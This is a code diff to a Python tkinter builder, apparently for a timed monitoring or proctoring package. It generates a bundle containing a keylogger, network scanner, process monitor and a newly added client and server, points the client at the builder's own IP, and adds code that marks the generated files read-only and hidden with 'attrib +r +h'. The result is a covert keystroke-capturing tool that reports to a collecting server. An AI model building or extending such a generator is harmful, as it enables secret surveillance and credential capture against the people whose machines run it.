@@ -3,8 +3,8 @@ from tkinter import *
 from tkinter import filedialog,messagebox
 from tkinter import ttk
 from tkinter.font import BOLD
-from PIL import Image, ImageTk
 import subprocess
+import socket
 import os
 import zipfile
 import shutil
@@ -17,6 +17,13 @@ from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad, unpad
 
 #=====================key==============================
+
+def ipv4_host():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+
+    host = str(s.getsockname()[0])
+    return host
 
 def generateAESkey(subject):
     # key AES 256 bits
@@ -86,46 +93,87 @@ def createApp(subject, time_start, time_stop):
 
     with open('material/file_process', 'r') as f:
         process_app = f.read()
+
+    with open('material/install_setup', 'r') as f:
+        install = f.read()
+
+    with open('material/client' ,'r') as f:
+        client = f.read()
+
+    with open('material/server', 'r') as f:
+        server = f.read()
         
-    time1 = '"' + str(time_start) + '"'
-    time2 = '"' + str(time_stop) + '"'
+    time1 =str(time_start)
+    time2 =str(time_stop)
     main_app = main_app.replace("TIMER_START", time1)
     main_app = main_app.replace("TIMER_STOP", time2)
+
+    host = ipv4_host()
+    client = client.replace("HOST_IP_SERVER", host)
+    server = server.replace("HOST_IP_SERVER", host)
 
     generateAESkey(subject)
     generateRSAkey(subject)
 
+    file = subject+"/Server/"
+    os.makedirs(os.path.dirname(file))
+    file = file + "server.py"
+    with open(file, 'w') as f:
+        f.write(server)
+        print("create Receiver..")
+
+    dirfile= []
     file = subject+"/"+subject+"/Main_App.py"
     with open(file, 'w') as f:
         f.write(main_app)
         print("create Main Complete")
-    
+    dirfile.append(file)
+
     file = subject+"/"+subject+"/material/Keylogger.py"
     with open(file, 'w') as f:
         f.write(key_app)
         print("create keylogger Complete")
+    dirfile.append(file)
 
     file = subject+"/"+subject+"/material/networkscan.py"
     with open(file, 'w') as f:
         f.write(net_app)
         print("create Networkscan Complete")
-    
+    dirfile.append(file)
+
     file = subject+"/"+subject+"/material/getadapter.py"
     with open(file, 'w') as f:
         f.write(adapt_app)
         print("create Networkadapter Complete")
+    dirfile.append(file)
 
     file = subject+"/"+subject+"/material/processmonitor.py"
     with open(file, 'w') as f:
         f.write(process_app)
         print("create processmonitor Complete")
+    dirfile.append(file)
+
+    file = subject+"/"+subject+"/client.py"
+    with open(file, 'w') as f:
+        f.write(client)
+        print("create client Complete")
+    dirfile.append(file)
+
+    file = subject+"/"+subject+"/setup.py"
+    with open(file, 'w') as f:
+        f.write(install)
     
     file_icon = ['material/icon2.ico']
     for icon in file_icon:
         shutil.copy(icon, subject+'/'+ subject +'/material/icon2.ico')
+    
+    for name_file in dirfile:
+        subprocess.run('attrib +r +h ' + name_file, shell=True)
 
+    print("Commplete!!")
+    print("=================================================")
     messagebox.showinfo(title="Create Complete", message="Create : "+subject)
-
+    quit()
 def more_APP():
 
     global keywords
@@ -145,6 +193,8 @@ def more_APP():
 def on_click():
 
     subject = subject_entry.get()
+    subject = subject.replace(' ','_')
+    # print(subject)
     time_list = [str(hour_startbox.get()), str(min_startbox.get()), str(hour_stopbox.get()), str(min_stopbox.get())]
     err = 0
     i = 0
@@ -159,8 +209,8 @@ def on_click():
     if err:
         messagebox.showerror(title="Invalid", message="Time Invalid!!")
     else:
-        timingstart = str(hour_startbox.get()) + str(min_startbox.get()) + "00"
-        timingstop = str(hour_stopbox.get()) + str(min_stopbox.get()) + "00"
+        timingstart = str(time_list[0]) + str(time_list[1]) + "00"
+        timingstop = str(time_list[2]) + str(time_list[3]) + "00"
         print("Subject : ",subject)
         print("time start : ",timingstart)
         print("time out : ",timingstop)
